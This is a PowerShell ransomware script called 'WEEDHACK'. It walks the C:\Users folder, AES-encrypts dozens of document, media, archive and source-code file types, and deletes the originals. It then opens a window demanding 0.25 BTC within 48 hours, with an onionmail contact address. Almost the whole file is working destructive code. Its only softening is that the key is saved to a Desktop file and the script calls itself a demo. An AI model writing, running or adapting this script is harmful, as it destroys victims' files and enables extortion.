$Target = "C:\Users"
$Extension = ".weedhack"
$Delay = 30
$FileTypes = @('.txt', '.pdf', '.docx', '.xlsx', '.xls', '.doc', '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.mp4', '.avi', '.mkv', '.mp3', '.wav', '.zip', '.rar', '.7z', '.tar', '.gz', '.sql', '.mdb', '.db', '.json', '.xml', '.config', '.py', '.js', '.java', '.cpp', '.cs', '.html', '.css', '.php')

Write-Host "========================================" -ForegroundColor Red
Write-Host "          WEEDHACK RANSOMWARE           " -ForegroundColor Red
Write-Host "       Extension: $Extension            " -ForegroundColor Red
Write-Host "       Targets: $($FileTypes.Count) file types" -ForegroundColor Red
Write-Host "========================================" -ForegroundColor Red


$aes = [System.Security.Cryptography.Aes]::Create()
$key = $aes.Key
$iv = $aes.IV
$encryptor = $aes.CreateEncryptor()
$count = 0


Write-Host "Scanning for target files..." -ForegroundColor Yellow
$files = @()
Get-ChildItem $Target -Recurse -File -ErrorAction SilentlyContinue | 
    Where-Object { 
        $_.Extension -in $FileTypes -and 
        $_.Extension -ne $Extension -and 
        $_.Length -lt 100MB -and
        $_.FullName -notmatch '\\Windows\\|\\Program Files\\|\\ProgramData\\|\\Temp\\|\\AppData\\Local\\Microsoft\\'
    } | 
    ForEach-Object { $files += $_.FullName }

Write-Host "Found $($files.Count) target files" -ForegroundColor Yellow


Write-Host "Encrypting files..." -ForegroundColor Yellow
foreach ($filePath in $files) {
    try {
 
        $data = [IO.File]::ReadAllBytes($filePath)
        $encrypted = $encryptor.TransformFinalBlock($data, 0, $data.Length)
        

        [IO.File]::WriteAllBytes($filePath + $Extension, $iv + $encrypted)
        

        [IO.File]::Delete($filePath)
        
        $count++
        if ($count % 500 -eq 0) { 
            Write-Host "[$count/$($files.Count)]" -NoNewline 
        } elseif ($count % 100 -eq 0) {
            Write-Host "." -NoNewline
        }
    } catch {
     
        continue
    }
}

Write-Host "`n`nEncrypted $count/$($files.Count) files with $Extension" -ForegroundColor Green


$keyB64 = [Convert]::ToBase64String($key)
$ivB64 = [Convert]::ToBase64String($iv)
"WEEDHACK RECOVERY KEY`n=====================`nAES Key (Base64): $keyB64`nAES IV (Base64): $ivB64`nFiles: $count`nExtension: $Extension" | 
    Out-File "$env:USERPROFILE\Desktop\WEEDHACK_RECOVERY_KEY.txt"


Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object Windows.Forms.Form
$form.Size = New-Object Drawing.Size(700, 400)
$form.Text = "WEEDHACK RANSOMWARE"
$form.StartPosition = "CenterScreen"
$form.TopMost = $true

$label = New-Object Windows.Forms.Label
$label.Text = "YOUR FILES ARE ENCRYPTED WITH .weedhack EXTENSION"
$label.AutoSize = $true
$label.Location = New-Object Drawing.Size(20, 20)
$label.Font = New-Object Drawing.Font("Arial", 12, [Drawing.FontStyle]::Bold)
$form.Controls.Add($label)

$label2 = New-Object Windows.Forms.Label
$label2.Text = "Encrypted: $count files"
$label2.AutoSize = $true
$label2.Location = New-Object Drawing.Size(20, 60)
$label2.Font = New-Object Drawing.Font("Arial", 10)
$form.Controls.Add($label2)

$label3 = New-Object Windows.Forms.Label
$label3.Text = "Send 0.25 BTC to: bc1qweedhackaddressxxxxxxxxxxxxx"
$label3.AutoSize = $true
$label3.Location = New-Object Drawing.Size(20, 90)
$label3.Font = New-Object Drawing.Font("Arial", 10, [Drawing.FontStyle]::Bold)
$form.Controls.Add($label3)

$textbox = New-Object Windows.Forms.TextBox
$textbox.Multiline = $true
$textbox.Text = "All your documents, images, videos, and archives have been encrypted with AES-256.`n`nTo recover your files, you must pay 0.25 BTC within 48 hours.`n`nContact: weedhack@onionmail.org`nPayment address: bc1qweedhackaddressxxxxxxxxxxxxx`n`nDO NOT attempt to decrypt files yourself - you will lose them permanently."
$textbox.Size = New-Object Drawing.Size(650, 180)
$textbox.Location = New-Object Drawing.Size(20, 120)
$textbox.ReadOnly = $true
$textbox.ScrollBars = "Vertical"
$form.Controls.Add($textbox)

$timer = $Delay
$timerLabel = New-Object Windows.Forms.Label
$timerLabel.Location = New-Object Drawing.Size(20, 320)
$timerLabel.AutoSize = $true
$timerLabel.Font = New-Object Drawing.Font("Arial", 14, [Drawing.FontStyle]::Bold)
$form.Controls.Add($timerLabel)

$form.Add_Shown({
    $timer = $Delay
    while ($timer -gt 0) {
        $timerLabel.Text = "Window closes in: $timer seconds"
        $timerLabel.ForeColor = if ($timer -lt 10) { "Red" } else { "Green" }
        $form.Refresh()
        Start-Sleep 1
        $timer--
    }
    $form.Close()
})

[void]$form.ShowDialog()

Write-Host "Ransom note displayed for $Delay seconds" -ForegroundColor Yellow
Write-Host "Recovery key saved to Desktop (FOR DEMO ONLY)" -ForegroundColor Yellow
